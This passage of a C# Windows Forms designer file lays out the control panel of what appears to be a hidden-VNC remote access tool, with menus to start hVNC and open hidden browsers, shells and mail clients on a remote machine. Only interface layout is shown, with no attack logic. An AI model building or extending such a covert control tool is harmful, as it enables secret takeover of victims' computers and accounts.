            this.QualityScroll.HoverState.Parent = this.QualityScroll;
            this.QualityScroll.Location = new System.Drawing.Point(218, 5);
            this.QualityScroll.Name = "QualityScroll";
            this.QualityScroll.Size = new System.Drawing.Size(120, 27);
            this.QualityScroll.TabIndex = 8;
            this.QualityScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.QualityScroll.Value = 65;
            this.QualityScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.QualityScroll_Scroll);
            // 
            // chkClone1
            // 
            this.chkClone1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.chkClone1.AutoSize = true;
            this.chkClone1.ForeColor = System.Drawing.Color.Gainsboro;
            this.chkClone1.Location = new System.Drawing.Point(381, 12);
            this.chkClone1.Name = "chkClone1";
            this.chkClone1.Size = new System.Drawing.Size(68, 13);
            this.chkClone1.TabIndex = 4;
            this.chkClone1.Text = "Resize : 75%";
            // 
            // QualityLabel
            // 
            this.QualityLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.QualityLabel.AutoSize = true;
            this.QualityLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.QualityLabel.Location = new System.Drawing.Point(114, 12);
            this.QualityLabel.Name = "QualityLabel";
            this.QualityLabel.Size = new System.Drawing.Size(93, 13);
            this.QualityLabel.TabIndex = 5;
            this.QualityLabel.Text = "High Quality : 65%";
            // 
            // IntervalLabel
            // 
            this.IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.IntervalLabel.AutoSize = true;
            this.IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.IntervalLabel.Location = new System.Drawing.Point(-202, 3);
            this.IntervalLabel.Name = "IntervalLabel";
            this.IntervalLabel.Size = new System.Drawing.Size(88, 13);
            this.IntervalLabel.TabIndex = 6;
            this.IntervalLabel.Text = "Interval (ms): 500";
            this.IntervalLabel.Visible = false;
            // 
            // IntervalScroll
            // 
            this.IntervalScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.IntervalScroll.HoverState.Parent = this.IntervalScroll;
            this.IntervalScroll.Location = new System.Drawing.Point(-94, 6);
            this.IntervalScroll.Maximum = 1000;
            this.IntervalScroll.Name = "IntervalScroll";
            this.IntervalScroll.Size = new System.Drawing.Size(46, 26);
            this.IntervalScroll.TabIndex = 8;
            this.IntervalScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.IntervalScroll.Value = 500;
            this.IntervalScroll.Visible = false;
            this.IntervalScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.IntervalScroll_Scroll);
            // 
            // panel4
            // 
            this.panel4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.panel4.Controls.Add(this.IntervalScroll);
            this.panel4.Controls.Add(this.IntervalLabel);
            this.panel4.Controls.Add(this.guna2Button2);
            this.panel4.Controls.Add(this.CloseBtn);
            this.panel4.Controls.Add(this.ResizeScroll);
            this.panel4.Controls.Add(this.RestoreMaxBtn);
            this.panel4.Controls.Add(this.QualityScroll);
            this.panel4.Controls.Add(this.chkClone1);
            this.panel4.Controls.Add(this.MinBtn);
            this.panel4.Controls.Add(this.QualityLabel);
            this.panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel4.Location = new System.Drawing.Point(0, 433);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(935, 35);
            this.panel4.TabIndex = 39;
            // 
            // guna2Button2
            // 
            this.guna2Button2.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button2.BorderColor = System.Drawing.Color.Transparent;
            this.guna2Button2.CheckedState.Parent = this.guna2Button2;
            this.guna2Button2.CustomImages.Parent = this.guna2Button2;
            this.guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2Button2.DisabledState.Parent = this.guna2Button2;
            this.guna2Button2.FillColor = System.Drawing.Color.Transparent;
            this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button2.ForeColor = System.Drawing.Color.White;
            this.guna2Button2.HoverState.Parent = this.guna2Button2;
            this.guna2Button2.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button2.Image")));
            this.guna2Button2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2Button2.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2Button2.Location = new System.Drawing.Point(625, 3);
            this.guna2Button2.Name = "guna2Button2";
            this.guna2Button2.ShadowDecoration.Parent = this.guna2Button2;
            this.guna2Button2.Size = new System.Drawing.Size(170, 29);
            this.guna2Button2.TabIndex = 39;
            this.guna2Button2.Text = "Disconnect";
            this.guna2Button2.Click += new System.EventHandler(this.guna2Button2_Click);
            // 
            // CloseBtn
            // 
            this.CloseBtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
            this.CloseBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
            this.CloseBtn.CheckedState.Parent = this.CloseBtn;
            this.CloseBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
            this.CloseBtn.HoverState.Parent = this.CloseBtn;
            this.CloseBtn.Image = ((System.Drawing.Image)(resources.GetObject("CloseBtn.Image")));
            this.CloseBtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.CloseBtn.ImageRotate = 0F;
            this.CloseBtn.ImageSize = new System.Drawing.Size(30, 30);
            this.CloseBtn.Location = new System.Drawing.Point(888, 2);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
            this.CloseBtn.PressedState.Parent = this.CloseBtn;
            this.CloseBtn.ShadowDecoration.Parent = this.CloseBtn;
            this.CloseBtn.Size = new System.Drawing.Size(36, 30);
            this.CloseBtn.TabIndex = 41;
            this.CloseBtn.UseTransparentBackground = true;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // RestoreMaxBtn
            // 
            this.RestoreMaxBtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.RestoreMaxBtn.BackColor = System.Drawing.Color.Transparent;
            this.RestoreMaxBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
            this.RestoreMaxBtn.CheckedState.Parent = this.RestoreMaxBtn;
            this.RestoreMaxBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
            this.RestoreMaxBtn.HoverState.Parent = this.RestoreMaxBtn;
            this.RestoreMaxBtn.Image = ((System.Drawing.Image)(resources.GetObject("RestoreMaxBtn.Image")));
            this.RestoreMaxBtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.RestoreMaxBtn.ImageRotate = 0F;
            this.RestoreMaxBtn.ImageSize = new System.Drawing.Size(30, 30);
            this.RestoreMaxBtn.Location = new System.Drawing.Point(852, 2);
            this.RestoreMaxBtn.Name = "RestoreMaxBtn";
            this.RestoreMaxBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
            this.RestoreMaxBtn.PressedState.Parent = this.RestoreMaxBtn;
            this.RestoreMaxBtn.ShadowDecoration.Parent = this.RestoreMaxBtn;
            this.RestoreMaxBtn.Size = new System.Drawing.Size(36, 30);
            this.RestoreMaxBtn.TabIndex = 42;
            this.RestoreMaxBtn.UseTransparentBackground = true;
            this.RestoreMaxBtn.Click += new System.EventHandler(this.RestoreMaxBtn_Click);
            // 
            // MinBtn
            // 
            this.MinBtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.MinBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
            this.MinBtn.CheckedState.Parent = this.MinBtn;
            this.MinBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
            this.MinBtn.HoverState.Parent = this.MinBtn;
            this.MinBtn.Image = ((System.Drawing.Image)(resources.GetObject("MinBtn.Image")));
            this.MinBtn.ImageOffset = new System.Drawing.Point(0, 0);
            this.MinBtn.ImageRotate = 0F;
            this.MinBtn.ImageSize = new System.Drawing.Size(30, 30);
            this.MinBtn.Location = new System.Drawing.Point(816, 2);
            this.MinBtn.Name = "MinBtn";
            this.MinBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
            this.MinBtn.PressedState.Parent = this.MinBtn;
            this.MinBtn.ShadowDecoration.Parent = this.MinBtn;
            this.MinBtn.Size = new System.Drawing.Size(36, 30);
            this.MinBtn.TabIndex = 43;
            this.MinBtn.Click += new System.EventHandler(this.MinBtn_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(244, 6);
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.panel3.Controls.Add(this.guna2Button4);
            this.panel3.Controls.Add(this.guna2Button1);
            this.panel3.Controls.Add(this.label1);
            this.panel3.Controls.Add(this.guna2Button3);
            this.panel3.Controls.Add(this.chkClone);
            this.panel3.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel3.Location = new System.Drawing.Point(0, 38);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(935, 41);
            this.panel3.TabIndex = 36;
            // 
            // guna2Button4
            // 
            this.guna2Button4.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button4.Animated = true;
            this.guna2Button4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button4.BorderThickness = 2;
            this.guna2Button4.CheckedState.Parent = this.guna2Button4;
            this.guna2Button4.CustomImages.Parent = this.guna2Button4;
            this.guna2Button4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2Button4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2Button4.DisabledState.Parent = this.guna2Button4;
            this.guna2Button4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button4.ForeColor = System.Drawing.Color.Gainsboro;
            this.guna2Button4.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2Button4.HoverState.Parent = this.guna2Button4;
            this.guna2Button4.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button4.Image")));
            this.guna2Button4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2Button4.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2Button4.Location = new System.Drawing.Point(684, 3);
            this.guna2Button4.Name = "guna2Button4";
            this.guna2Button4.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.guna2Button4.ShadowDecoration.Parent = this.guna2Button4;
            this.guna2Button4.Size = new System.Drawing.Size(247, 34);
            this.guna2Button4.TabIndex = 149;
            this.guna2Button4.Text = "Hidden Applications";
            this.guna2Button4.Click += new System.EventHandler(this.guna2Button4_Click_1);
            // 
            // guna2Button1
            // 
            this.guna2Button1.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button1.Animated = true;
            this.guna2Button1.BackColor = System.Drawing.Color.Black;
            this.guna2Button1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button1.BorderThickness = 2;
            this.guna2Button1.CheckedState.Parent = this.guna2Button1;
            this.guna2Button1.CustomImages.Parent = this.guna2Button1;
            this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2Button1.DisabledState.Parent = this.guna2Button1;
            this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button1.ForeColor = System.Drawing.Color.Gainsboro;
            this.guna2Button1.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2Button1.HoverState.Parent = this.guna2Button1;
            this.guna2Button1.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button1.Image")));
            this.guna2Button1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2Button1.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2Button1.Location = new System.Drawing.Point(178, 3);
            this.guna2Button1.Name = "guna2Button1";
            this.guna2Button1.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.guna2Button1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.guna2Button1.ShadowDecoration.Parent = this.guna2Button1;
            this.guna2Button1.Size = new System.Drawing.Size(247, 34);
            this.guna2Button1.TabIndex = 148;
            this.guna2Button1.Text = "Hidden Browsers";
            this.guna2Button1.Click += new System.EventHandler(this.guna2Button1_Click_1);
            // 
            // guna2Button3
            // 
            this.guna2Button3.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button3.Animated = true;
            this.guna2Button3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button3.BorderThickness = 2;
            this.guna2Button3.CheckedState.Parent = this.guna2Button3;
            this.guna2Button3.CustomImages.Parent = this.guna2Button3;
            this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2Button3.DisabledState.Parent = this.guna2Button3;
            this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button3.ForeColor = System.Drawing.Color.Gainsboro;
            this.guna2Button3.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2Button3.HoverState.Parent = this.guna2Button3;
            this.guna2Button3.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button3.Image")));
            this.guna2Button3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2Button3.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2Button3.Location = new System.Drawing.Point(431, 3);
            this.guna2Button3.Name = "guna2Button3";
            this.guna2Button3.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.guna2Button3.ShadowDecoration.Parent = this.guna2Button3;
            this.guna2Button3.Size = new System.Drawing.Size(247, 34);
            this.guna2Button3.TabIndex = 45;
            this.guna2Button3.Text = "Hidden System Control";
            this.guna2Button3.Click += new System.EventHandler(this.guna2Button3_Click_2);
            // 
            // guna2ContextMenuStrip2
            // 
            this.guna2ContextMenuStrip2.BackColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(25, 25);
            this.guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fileExplorerToolStripMenuItem,
            this.powershellToolStripMenuItem,
            this.cMDToolStripMenuItem,
            this.windowsToolStripMenuItem,
            this.copyToolStripMenuItem,
            this.toolStripMenuItem2,
            this.StarthVNC,
            this.StophVNC});
            this.guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip2";
            this.guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip2.Size = new System.Drawing.Size(248, 260);
            // 
            // fileExplorerToolStripMenuItem
            // 
            this.fileExplorerToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.fileExplorerToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.fileExplorerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileExplorerToolStripMenuItem.Image")));
            this.fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
            this.fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.fileExplorerToolStripMenuItem.Text = "  File Explorer                 ";
            this.fileExplorerToolStripMenuItem.Click += new System.EventHandler(this.fileExplorerToolStripMenuItem_Click);
            // 
            // powershellToolStripMenuItem
            // 
            this.powershellToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.powershellToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.powershellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("powershellToolStripMenuItem.Image")));
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.powershellToolStripMenuItem.Text = "  Powershell";
            this.powershellToolStripMenuItem.Click += new System.EventHandler(this.powershellToolStripMenuItem_Click);
            // 
            // cMDToolStripMenuItem
            // 
            this.cMDToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cMDToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.cMDToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("cMDToolStripMenuItem.Image")));
            this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
            this.cMDToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.cMDToolStripMenuItem.Text = "  CMD";
            this.cMDToolStripMenuItem.Click += new System.EventHandler(this.cMDToolStripMenuItem_Click);
            // 
            // windowsToolStripMenuItem
            // 
            this.windowsToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.windowsToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.windowsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("windowsToolStripMenuItem.Image")));
            this.windowsToolStripMenuItem.Name = "windowsToolStripMenuItem";
            this.windowsToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.windowsToolStripMenuItem.Text = "  Windows";
            this.windowsToolStripMenuItem.Click += new System.EventHandler(this.windowsToolStripMenuItem_Click);
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.copyToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.copyToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("copyToolStripMenuItem.Image")));
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.copyToolStripMenuItem.Text = "  Copy";
            this.copyToolStripMenuItem.Click += new System.EventHandler(this.copyToolStripMenuItem_Click);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.Gainsboro;
            this.toolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem2.Image")));
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(247, 32);
            this.toolStripMenuItem2.Text = "  Paste";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.pasteToolStripMenuItem_Click);
            // 
            // StarthVNC
            // 
            this.StarthVNC.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StarthVNC.ForeColor = System.Drawing.Color.Gainsboro;
            this.StarthVNC.Image = ((System.Drawing.Image)(resources.GetObject("StarthVNC.Image")));
            this.StarthVNC.Name = "StarthVNC";
            this.StarthVNC.Size = new System.Drawing.Size(247, 32);
            this.StarthVNC.Text = "  Start hVNC";
            this.StarthVNC.Click += new System.EventHandler(this.StarthVNC_Click);
            // 
            // StophVNC
            // 
            this.StophVNC.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StophVNC.ForeColor = System.Drawing.Color.Gainsboro;
            this.StophVNC.Image = ((System.Drawing.Image)(resources.GetObject("StophVNC.Image")));
            this.StophVNC.Name = "StophVNC";
            this.StophVNC.Size = new System.Drawing.Size(247, 32);
            this.StophVNC.Text = "  Stop hVNC";
            this.StophVNC.Click += new System.EventHandler(this.StophVNC_Click);
            // 
            // guna2ContextMenuStrip1
            // 
            this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(25, 25);
            this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.test1ToolStripMenuItem,
            this.test2ToolStripMenuItem,
            this.braveToolStripMenuItem,
            this.edgeToolStripMenuItem,
            this.operaGXToolStripMenuItem});
            this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(248, 164);
            // 
            // test1ToolStripMenuItem
            // 
            this.test1ToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.test1ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("test1ToolStripMenuItem.Image")));
            this.test1ToolStripMenuItem.Name = "test1ToolStripMenuItem";
            this.test1ToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.test1ToolStripMenuItem.Text = "  Hidden Chrome          ";
            this.test1ToolStripMenuItem.Click += new System.EventHandler(this.test1ToolStripMenuItem_Click);
            // 
            // test2ToolStripMenuItem
            // 
            this.test2ToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.test2ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("test2ToolStripMenuItem.Image")));
            this.test2ToolStripMenuItem.Name = "test2ToolStripMenuItem";
            this.test2ToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.test2ToolStripMenuItem.Text = "  Hidden FireFox";
            this.test2ToolStripMenuItem.Click += new System.EventHandler(this.test2ToolStripMenuItem_Click);
            // 
            // braveToolStripMenuItem
            // 
            this.braveToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.braveToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("braveToolStripMenuItem.Image")));
            this.braveToolStripMenuItem.Name = "braveToolStripMenuItem";
            this.braveToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.braveToolStripMenuItem.Text = "  Hidden Brave";
            this.braveToolStripMenuItem.Click += new System.EventHandler(this.braveToolStripMenuItem_Click);
            // 
            // edgeToolStripMenuItem
            // 
            this.edgeToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.edgeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("edgeToolStripMenuItem.Image")));
            this.edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
            this.edgeToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.edgeToolStripMenuItem.Text = "  Hidden Edge";
            this.edgeToolStripMenuItem.Click += new System.EventHandler(this.edgeToolStripMenuItem_Click);
            // 
            // operaGXToolStripMenuItem
            // 
            this.operaGXToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.operaGXToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("operaGXToolStripMenuItem.Image")));
            this.operaGXToolStripMenuItem.Name = "operaGXToolStripMenuItem";
            this.operaGXToolStripMenuItem.Size = new System.Drawing.Size(247, 32);
            this.operaGXToolStripMenuItem.Text = "  Hidden Opera";
            this.operaGXToolStripMenuItem.Click += new System.EventHandler(this.operaGXToolStripMenuItem_Click);
            // 
            // guna2ContextMenuStrip3
            // 
            this.guna2ContextMenuStrip3.BackColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip3.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2ContextMenuStrip3.ImageScalingSize = new System.Drawing.Size(25, 25);
            this.guna2ContextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.thunderbirdToolStripMenuItem,
            this.outlookToolStripMenuItem,
            this.foxMailToolStripMenuItem});
            this.guna2ContextMenuStrip3.Name = "guna2ContextMenuStrip3";
            this.guna2ContextMenuStrip3.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.guna2ContextMenuStrip3.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.guna2ContextMenuStrip3.RenderStyle.ColorTable = null;
